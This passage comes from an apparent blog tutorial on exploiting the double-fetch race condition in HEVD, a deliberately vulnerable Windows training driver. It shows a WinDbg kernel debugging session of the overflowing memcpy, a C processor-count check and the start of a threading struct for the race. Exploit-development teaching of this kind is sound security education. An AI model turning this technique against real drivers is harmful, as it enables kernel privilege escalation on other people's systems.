<span class="normal"><a href="#__codelineno-8-17">17</a></span>
<span class="normal"><a href="#__codelineno-8-18">18</a></span>
<span class="normal"><a href="#__codelineno-8-19">19</a></span>
<span class="normal"><a href="#__codelineno-8-20">20</a></span>
<span class="normal"><a href="#__codelineno-8-21">21</a></span>
<span class="normal"><a href="#__codelineno-8-22">22</a></span>
<span class="normal"><a href="#__codelineno-8-23">23</a></span>
<span class="normal"><a href="#__codelineno-8-24">24</a></span>
<span class="normal"><a href="#__codelineno-8-25">25</a></span>
<span class="normal"><a href="#__codelineno-8-26">26</a></span>
<span class="normal"><a href="#__codelineno-8-27">27</a></span>
<span class="normal"><a href="#__codelineno-8-28">28</a></span>
<span class="normal"><a href="#__codelineno-8-29">29</a></span>
<span class="normal"><a href="#__codelineno-8-30">30</a></span>
<span class="normal"><a href="#__codelineno-8-31">31</a></span>
<span class="normal"><a href="#__codelineno-8-32">32</a></span>
<span class="normal"><a href="#__codelineno-8-33">33</a></span>
<span class="normal"><a href="#__codelineno-8-34">34</a></span>
<span class="normal"><a href="#__codelineno-8-35">35</a></span>
<span class="normal"><a href="#__codelineno-8-36">36</a></span>
<span class="normal"><a href="#__codelineno-8-37">37</a></span>
<span class="normal"><a href="#__codelineno-8-38">38</a></span>
<span class="normal"><a href="#__codelineno-8-39">39</a></span>
<span class="normal"><a href="#__codelineno-8-40">40</a></span>
<span class="normal"><a href="#__codelineno-8-41">41</a></span>
<span class="normal"><a href="#__codelineno-8-42">42</a></span>
<span class="normal"><a href="#__codelineno-8-43">43</a></span>
<span class="normal"><a href="#__codelineno-8-44">44</a></span>
<span class="normal"><a href="#__codelineno-8-45">45</a></span>
<span class="normal"><a href="#__codelineno-8-46">46</a></span>
<span class="normal"><a href="#__codelineno-8-47">47</a></span>
<span class="normal"><a href="#__codelineno-8-48">48</a></span>
<span class="normal"><a href="#__codelineno-8-49">49</a></span>
<span class="normal"><a href="#__codelineno-8-50">50</a></span>
<span class="normal"><a href="#__codelineno-8-51">51</a></span>
<span class="normal"><a href="#__codelineno-8-52">52</a></span>
<span class="normal"><a href="#__codelineno-8-53">53</a></span>
<span class="normal"><a href="#__codelineno-8-54">54</a></span>
<span class="normal"><a href="#__codelineno-8-55">55</a></span>
<span class="normal"><a href="#__codelineno-8-56">56</a></span>
<span class="normal"><a href="#__codelineno-8-57">57</a></span>
<span class="normal"><a href="#__codelineno-8-58">58</a></span>
<span class="normal"><a href="#__codelineno-8-59">59</a></span>
<span class="normal"><a href="#__codelineno-8-60">60</a></span>
<span class="normal"><a href="#__codelineno-8-61">61</a></span>
<span class="normal"><a href="#__codelineno-8-62">62</a></span>
<span class="normal"><a href="#__codelineno-8-63">63</a></span>
<span class="normal"><a href="#__codelineno-8-64">64</a></span>
<span class="normal"><a href="#__codelineno-8-65">65</a></span>
<span class="normal"><a href="#__codelineno-8-66">66</a></span>
<span class="normal"><a href="#__codelineno-8-67">67</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">r</span><span class="w"></span>
<a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="n">rax</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">rbx</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">rcx</span><span class="o">=</span><span class="mo">000000000000004</span><span class="n">d</span><span class="w"></span>
<a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="n">rdx</span><span class="o">=</span><span class="mo">0000000000000003</span><span class="w"> </span><span class="n">rsi</span><span class="o">=</span><span class="mo">0000000000000003</span><span class="w"> </span><span class="n">rdi</span><span class="o">=</span><span class="mo">000001</span><span class="mi">8</span><span class="n">c389b0000</span><span class="w"></span>
<a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="n">rip</span><span class="o">=</span><span class="n">fffff805b49468df</span><span class="w"> </span><span class="n">rsp</span><span class="o">=</span><span class="n">ffffb40015e3df90</span><span class="w"> </span><span class="n">rbp</span><span class="o">=</span><span class="n">ffff8f886e5c87c0</span><span class="w"></span>
<a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="w"> </span><span class="n">r8</span><span class="o">=</span><span class="mo">000000000000004</span><span class="n">d</span><span class="w">  </span><span class="n">r9</span><span class="o">=</span><span class="mo">0000000000000</span><span class="mi">800</span><span class="w"> </span><span class="c1">// (2) r10=0000000000000000</span>
<a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="n">r11</span><span class="o">=</span><span class="n">ffffb40015e3df88</span><span class="w"> </span><span class="n">r12</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">r13</span><span class="o">=</span><span class="n">ffff8f886d97c6b0</span><span class="w"></span>
<a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="n">r14</span><span class="o">=</span><span class="mo">000000000000004</span><span class="n">d</span><span class="w"> </span><span class="n">r15</span><span class="o">=</span><span class="mo">0000000000000</span><span class="mi">800</span><span class="w"> </span><span class="c1">// (1)</span>
<a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="n">iopl</span><span class="o">=</span><span class="mi">0</span><span class="w">         </span><span class="n">nv</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">ei</span><span class="w"> </span><span class="n">ng</span><span class="w"> </span><span class="n">nz</span><span class="w"> </span><span class="n">na</span><span class="w"> </span><span class="n">po</span><span class="w"> </span><span class="n">nc</span><span class="w"></span>
<a id="__codelineno-8-9" name="__codelineno-8-9"></a><span class="n">cs</span><span class="o">=</span><span class="mo">0010</span><span class="w">  </span><span class="n">ss</span><span class="o">=</span><span class="mo">001</span><span class="mi">8</span><span class="w">  </span><span class="n">ds</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">  </span><span class="n">es</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">  </span><span class="n">fs</span><span class="o">=</span><span class="mo">0053</span><span class="w">  </span><span class="n">gs</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">             </span><span class="n">efl</span><span class="o">=</span><span class="mo">000002</span><span class="mi">86</span><span class="w"></span>
<a id="__codelineno-8-10" name="__codelineno-8-10"></a>
<a id="__codelineno-8-11" name="__codelineno-8-11"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xc3</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-8-12" name="__codelineno-8-12"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b49468df</span><span class="w"> </span><span class="mi">4</span><span class="n">d3bcf</span><span class="w">          </span><span class="n">cmp</span><span class="w">     </span><span class="n">r9</span><span class="p">,</span><span class="n">r15</span><span class="w"></span>
<a id="__codelineno-8-13" name="__codelineno-8-13"></a>
<a id="__codelineno-8-14" name="__codelineno-8-14"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="w"></span>
<a id="__codelineno-8-15" name="__codelineno-8-15"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xc6</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-8-16" name="__codelineno-8-16"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b49468e2</span><span class="w"> </span><span class="mi">7614</span><span class="w">            </span><span class="n">jbe</span><span class="w">     </span><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xdc</span><span class="w"> </span><span class="p">(</span><span class="n">fffff805</span><span class="err">`</span><span class="n">b49468f8</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-8-17" name="__codelineno-8-17"></a>
<a id="__codelineno-8-18" name="__codelineno-8-18"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span>
<a id="__codelineno-8-19" name="__codelineno-8-19"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xdc</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-8-20" name="__codelineno-8-20"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b49468f8</span><span class="w"> </span><span class="mi">4</span><span class="n">c8d05f1280000</span><span class="w">  </span><span class="n">lea</span><span class="w">     </span><span class="n">r8</span><span class="p">,[</span><span class="n">HEVD</span><span class="o">!</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="o">::</span><span class="n">NNGAKEGL</span><span class="o">::</span><span class="err">`</span><span class="n">string</span><span class="err">&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">fffff805</span><span class="err">`</span><span class="n">b49491f0</span><span class="p">)]</span><span class="w"></span>
<a id="__codelineno-8-21" name="__codelineno-8-21"></a>
<a id="__codelineno-8-22" name="__codelineno-8-22"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="err">@</span><span class="n">rdx</span><span class="w"></span>
<a id="__codelineno-8-23" name="__codelineno-8-23"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252b0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-24" name="__codelineno-8-24"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252c0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-25" name="__codelineno-8-25"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252d0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-26" name="__codelineno-8-26"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252e0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-27" name="__codelineno-8-27"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252f0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-28" name="__codelineno-8-28"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25300</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-29" name="__codelineno-8-29"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25310</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-30" name="__codelineno-8-30"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25320</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-31" name="__codelineno-8-31"></a>
<a id="__codelineno-8-32" name="__codelineno-8-32"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="err">@</span><span class="n">rcx</span><span class="w"></span>
<a id="__codelineno-8-33" name="__codelineno-8-33"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfb0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-34" name="__codelineno-8-34"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfc0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-35" name="__codelineno-8-35"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfd0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-36" name="__codelineno-8-36"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfe0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-37" name="__codelineno-8-37"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dff0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-38" name="__codelineno-8-38"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e000</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-39" name="__codelineno-8-39"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e010</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-40" name="__codelineno-8-40"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e020</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-8-41" name="__codelineno-8-41"></a>
<a id="__codelineno-8-42" name="__codelineno-8-42"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">r</span><span class="w"></span>
<a id="__codelineno-8-43" name="__codelineno-8-43"></a><span class="n">rax</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">rbx</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">rcx</span><span class="o">=</span><span class="n">ffffb40015e3dfb0</span><span class="w"></span>
<a id="__codelineno-8-44" name="__codelineno-8-44"></a><span class="n">rdx</span><span class="o">=</span><span class="mo">000001</span><span class="mi">8</span><span class="n">c38a252b0</span><span class="w"> </span><span class="n">rsi</span><span class="o">=</span><span class="mo">0000000000000003</span><span class="w"> </span><span class="n">rdi</span><span class="o">=</span><span class="mo">000001</span><span class="mi">8</span><span class="n">c389b0000</span><span class="w"></span>
<a id="__codelineno-8-45" name="__codelineno-8-45"></a><span class="n">rip</span><span class="o">=</span><span class="n">fffff805b4946911</span><span class="w"> </span><span class="n">rsp</span><span class="o">=</span><span class="n">ffffb40015e3df90</span><span class="w"> </span><span class="n">rbp</span><span class="o">=</span><span class="n">ffff8f886e5c87c0</span><span class="w"></span>
<a id="__codelineno-8-46" name="__codelineno-8-46"></a><span class="w"> </span><span class="n">r8</span><span class="o">=</span><span class="mo">0000000000000</span><span class="mi">800</span><span class="w">  </span><span class="n">r9</span><span class="o">=</span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">r10</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"></span>
<a id="__codelineno-8-47" name="__codelineno-8-47"></a><span class="n">r11</span><span class="o">=</span><span class="n">ffffb40015e3df88</span><span class="w"> </span><span class="n">r12</span><span class="o">=</span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">r13</span><span class="o">=</span><span class="n">ffff8f886d97c6b0</span><span class="w"></span>
<a id="__codelineno-8-48" name="__codelineno-8-48"></a><span class="n">r14</span><span class="o">=</span><span class="mo">000000000000004</span><span class="n">d</span><span class="w"> </span><span class="n">r15</span><span class="o">=</span><span class="mo">0000000000000</span><span class="mi">800</span><span class="w"></span>
<a id="__codelineno-8-49" name="__codelineno-8-49"></a><span class="n">iopl</span><span class="o">=</span><span class="mi">0</span><span class="w">         </span><span class="n">nv</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">ei</span><span class="w"> </span><span class="n">ng</span><span class="w"> </span><span class="n">nz</span><span class="w"> </span><span class="n">na</span><span class="w"> </span><span class="n">po</span><span class="w"> </span><span class="n">nc</span><span class="w"></span>
<a id="__codelineno-8-50" name="__codelineno-8-50"></a><span class="n">cs</span><span class="o">=</span><span class="mo">0010</span><span class="w">  </span><span class="n">ss</span><span class="o">=</span><span class="mo">001</span><span class="mi">8</span><span class="w">  </span><span class="n">ds</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">  </span><span class="n">es</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">  </span><span class="n">fs</span><span class="o">=</span><span class="mo">0053</span><span class="w">  </span><span class="n">gs</span><span class="o">=</span><span class="mo">002</span><span class="n">b</span><span class="w">             </span><span class="n">efl</span><span class="o">=</span><span class="mo">000002</span><span class="mi">86</span><span class="w"></span>
<a id="__codelineno-8-51" name="__codelineno-8-51"></a>
<a id="__codelineno-8-52" name="__codelineno-8-52"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xf5</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-8-53" name="__codelineno-8-53"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b4946911</span><span class="w"> </span><span class="n">e8aaa8f7ff</span><span class="w">      </span><span class="n">call</span><span class="w">    </span><span class="n">HEVD</span><span class="o">!</span><span class="n">memcpy</span><span class="w"> </span><span class="p">(</span><span class="n">fffff805</span><span class="err">`</span><span class="n">b48c11c0</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-8-54" name="__codelineno-8-54"></a>
<a id="__codelineno-8-55" name="__codelineno-8-55"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="w"></span>
<a id="__codelineno-8-56" name="__codelineno-8-56"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0xfa</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-8-57" name="__codelineno-8-57"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b4946916</span><span class="w"> </span><span class="n">eb1b</span><span class="w">            </span><span class="n">jmp</span><span class="w">     </span><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0x117</span><span class="w"> </span><span class="p">(</span><span class="n">fffff805</span><span class="err">`</span><span class="n">b4946933</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-8-58" name="__codelineno-8-58"></a>
<a id="__codelineno-8-59" name="__codelineno-8-59"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="err">@</span><span class="n">rcx</span><span class="w"></span>
<a id="__codelineno-8-60" name="__codelineno-8-60"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfb0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-61" name="__codelineno-8-61"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfc0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-62" name="__codelineno-8-62"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfd0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-63" name="__codelineno-8-63"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dfe0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-64" name="__codelineno-8-64"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">dff0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-65" name="__codelineno-8-65"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e000</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-66" name="__codelineno-8-66"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e010</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-8-67" name="__codelineno-8-67"></a><span class="n">ffffb400</span><span class="err">`</span><span class="mf">15e3</span><span class="n">e020</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<ol>
<li><code>R15</code> has our input size.</li>
<li><code>R9</code> has the size of the stack allocated buffer</li>
</ol>
<p>Awesome, we clearly are able to execute a copy providing that we don't violate the size value. The question now is how we can make it such that we pass the size check with one value but then change that value so that we actually copy more. The answer is, multithreading.</p>
<h2 id="getting-started-with-multithreading">Getting Started with Multithreading<a class="headerlink" href="#getting-started-with-multithreading" title="Permanent link">&para;</a></h2>
<p>If you're not familar with multithreading it can be quite daunting at first. I'll do my best to describe all of the steps throughly however I am not a developer so if you're still unsure I'd highly recommend doing external reading around multithreading particularly in C.</p>
<p>The first thing we'll want to do is check that we have enough processors to exploit the bug, when targeting TOCTOU and similar bugs its important that we can win the race. That is, if we don't have enough compute power then the attack will take significantly longer to exploit successfully. In order to check if we have enough processors we can use the <code>processthreadsapi</code> API. The below code block is a very simple function to check our number of processors and fail if we don't have more than 2. <em>This is especially important as I am exploiting this vulnerability in a virtual machine, not on my host.</em></p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Check how many processors we have</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-9-10">10</a></span>
<span class="normal"><a href="#__codelineno-9-11">11</a></span>
<span class="normal"><a href="#__codelineno-9-12">12</a></span>
<span class="normal"><a href="#__codelineno-9-13">13</a></span>
<span class="normal"><a href="#__codelineno-9-14">14</a></span>
<span class="normal"><a href="#__codelineno-9-15">15</a></span>
<span class="normal"><a href="#__codelineno-9-16">16</a></span>
<span class="normal"><a href="#__codelineno-9-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;processthreadsapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-9-2" name="__codelineno-9-2"></a>
<a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">CheckProcessors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="w">    </span><span class="n">SYSTEM_INFO</span><span class="w"> </span><span class="n">SystemInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-9-6" name="__codelineno-9-6"></a>
<a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="w">    </span><span class="cm">/* Check if we have more than 2 processors as attack will take too long with less */</span><span class="w"></span>
<a id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="w">    </span><span class="n">GetSystemInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SystemInfo</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-9-10" name="__codelineno-9-10"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-9-11" name="__codelineno-9-11"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: You don&#39;t have enough processors, exiting!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-9-12" name="__codelineno-9-12"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-9-13" name="__codelineno-9-13"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-9-14" name="__codelineno-9-14"></a>
<a id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">NumProcessors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-9-16" name="__codelineno-9-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-9-17" name="__codelineno-9-17"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>In order to pass data into threads the easiest way is to create a strucutre for the thread and then pass that structure when we create the thread. We'll create a structure for our function which will send the <abbr title="Input Output Control">IOCTLs</abbr> to the driver. It looks fairly similar to the structure we created earlier for <code>UserDoubleFetch</code>. Notice the two members here are <code>DriverHandle</code> and <code>DoubleFetch</code> was a pointer to the <code>_USER_DOUBLE_FETCH</code> structure that we created earlier.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Structure to pass data to our IOCTL thread</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
<span class="normal"><a href="#__codelineno-10-2">2</a></span>
<span class="normal"><a href="#__codelineno-10-3">3</a></span>
<span class="normal"><a href="#__codelineno-10-4">4</a></span>
<span class="normal"><a href="#__codelineno-10-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_THREAD_PARAM</span><span class="w"></span>
<a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">              </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"> </span><span class="c1">// (1)</span>
